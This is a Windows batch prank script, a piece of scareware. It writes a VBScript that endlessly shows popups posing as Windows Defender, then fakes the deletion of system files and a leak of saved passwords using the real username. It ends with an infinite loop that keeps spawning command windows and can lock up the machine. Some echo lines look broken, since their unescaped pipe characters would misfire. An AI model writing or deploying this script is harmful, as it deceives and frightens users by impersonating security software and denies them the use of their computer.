@echo off
title SYSTEM BREACH - WINDOWS SECURITY
color 0A

:: Create looping popup (fake freeze)
echo Set wshShell = CreateObject("WScript.Shell") > %temp%\freeze.vbs
echo Do >> %temp%\freeze.vbs
echo wshShell.Popup "CRITICAL ERROR: Unauthorized Access Detected!",1,"Windows Defender",48 >> %temp%\freeze.vbs
echo Loop >> %temp%\freeze.vbs
start "" wscript.exe %temp%\freeze.vbs

:: Fake file deletion
cls
echo Accessing C:\System32...
ping localhost -n 2 >nul
echo Deleting core system files...
ping localhost -n 1 >nul
echo [###....................] 10%%
ping localhost -n 1 >nul
echo [########...............] 40%%
ping localhost -n 1 >nul
echo [#####################..] 90%%
ping localhost -n 1 >nul
echo [#######################] 100%%
echo SYSTEM FAILURE
ping localhost -n 2 >nul

:: Fake password leak
echo Exporting saved credentials...
ping localhost -n 2 >nul
echo [Gmail] user@gmail.com | pass: ******* 
echo [Instagram] user_insta | pass: ********
echo [Windows Login] %username% | pass: ********
ping localhost -n 2 >nul

:: Infinite CMD spam
:loop
start cmd /k echo SYSTEM HACKED! && exit
goto loop
